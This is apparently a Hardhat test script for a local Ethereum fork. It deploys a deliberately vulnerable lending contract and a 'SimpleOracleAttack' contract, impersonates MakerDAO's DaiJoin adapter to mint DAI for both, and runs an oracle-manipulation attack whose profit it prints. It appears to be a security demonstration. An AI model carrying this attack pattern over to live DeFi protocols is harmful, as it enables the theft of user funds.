import { ethers, network } from 'hardhat'
// @ts-ignore
import * as daiAbi from '../contracts/interfaces/Dai.json'

const BigNumber = ethers.BigNumber
type BigNumber = ReturnType<typeof ethers.BigNumber.from>

main()
    .then(() => console.log('Done!'))
    .catch((err) => {
        console.error(err)
        process.exit(42)
    })

const daiAddress = '0x6B175474E89094C44Da98b954EedeAC495271d0F'

async function main() {
    // Init stuff
    const signers = await ethers.getSigners()
    const signer = signers[0] // Loaded with 10k ETH

    // Deploy force sender
    const ForceSendEther = await ethers.getContractFactory('ForceSendEther')
    const forceSendEther = await ForceSendEther.deploy()
    // Deploy simple oracle example
    const VulnerableLendingProtocol = await ethers.getContractFactory('VulnerableLendingProtocol')
    const vulnerableLendingProtocol = await VulnerableLendingProtocol.deploy()
    await Promise.all([mine(), forceSendEther.deployed(), vulnerableLendingProtocol.deployed()])
    // Deploy attacker contract
    const SimpleOracleAttack = await ethers.getContractFactory('SimpleOracleAttack')
    const simpleOracleAttack = await SimpleOracleAttack.deploy(vulnerableLendingProtocol.address)
    await Promise.all([mine(), simpleOracleAttack.deployed()])

    console.log('Setting up DAI Join Adapter...')
    const daiJoinAdapterAddress = '0x9759A6Ac90977b93B58547b4A71c78317f391A28'
    await network.provider.request({
        method: 'hardhat_impersonateAccount',
        /** MakerDAO DaiJoin Adapter - The only ward in the DAI contract  */
        // Ref: https://github.com/makerdao/developerguides/blob/master/dai/dai-token/dai-token.md#authority
        params: [daiJoinAdapterAddress],
    })
    const daiSigner = await ethers.getSigner(daiJoinAdapterAddress)
    // Force send some ETH to the DaiJoin Adapter
    const sendEthToDaiJoinTx = await signer.sendTransaction(
        await forceSendEther.populateTransaction.forceSend(daiJoinAdapterAddress, {
            value: ethers.utils.parseEther('10.0'),
            gasLimit: BigNumber.from(300000), // DAI swap is usually ~200k gas
            gasPrice: BigNumber.from(10).mul(BigNumber.from(10).pow(9)), // in wei
        })
    )
    // Send ETH to the attacker contract
    const sendEthToAttackTx = await signer.sendTransaction({
        // For collateral + gas
        // TODO: Get this from a flash loan
        to: simpleOracleAttack.address,
        value: ethers.utils.parseEther('101.0'),
        gasLimit: BigNumber.from(300000),
        gasPrice: BigNumber.from(10).mul(BigNumber.from(10).pow(9)), // in wei
    })
    await Promise.all([mine(), sendEthToDaiJoinTx.wait(), sendEthToAttackTx.wait()])

    // Mint some DAI for the lending protocol
    console.log('Minting DAI for lending protocol...')
    const Dai = await ethers.getContractAt(daiAbi, daiAddress, daiSigner)
    let mintDaiTx = await daiSigner.sendTransaction(
        await Dai.populateTransaction.mint(
            vulnerableLendingProtocol.address,
            ethers.utils.parseEther('100000000')
        )
    )
    await mine()
    await mintDaiTx.wait()

    // Mint some DAI for the attacker
    // Normally, as an adversary, we would take out a flash loan for this DAI
    console.log('Minting DAI for attacker...')
    mintDaiTx = await daiSigner.sendTransaction(
        await Dai.populateTransaction.mint(
            simpleOracleAttack.address,
            // TODO: Use amount of DAI based on LP reserves
            ethers.utils.parseEther('30000000')
        )
    )
    await mine()
    await mintDaiTx.wait()
    const startingDai = await getDaiBalance(simpleOracleAttack.address)

    const attackTx = await signer.sendTransaction(
        await simpleOracleAttack.populateTransaction.attack({
            gasLimit: BigNumber.from(10000000),
            gasPrice: BigNumber.from(10).mul(BigNumber.from(10).pow(9)), // in wei
        })
    )
    await mine()
    await attackTx.wait()

    // Show that we're in profit
    const resultingDai = await getDaiBalance(simpleOracleAttack.address)
    console.log(`Profit: ${ethers.utils.formatEther(resultingDai.sub(startingDai))} DAI`)
    // const attackSuccessQuery = await simpleOracleAttack.queryFilter(
    //     simpleOracleAttack.filters.SuccessfulAttack(null)
    // )
    // console.log(ethers.utils.formatEther(attackSuccessQuery[0].args![0]))
    // assert(resultingDai.sub(startingDai) === attackSuccessQuery[0].args![0])
}

async function getDaiBalance(address: string) {
    const Dai = await ethers.getContractAt(daiAbi, daiAddress)
    const [balance] = (await Dai.functions.balanceOf(address)) as [BigNumber]
    return balance
}

async function mine() {
    await network.provider.send('evm_mine', [])
}
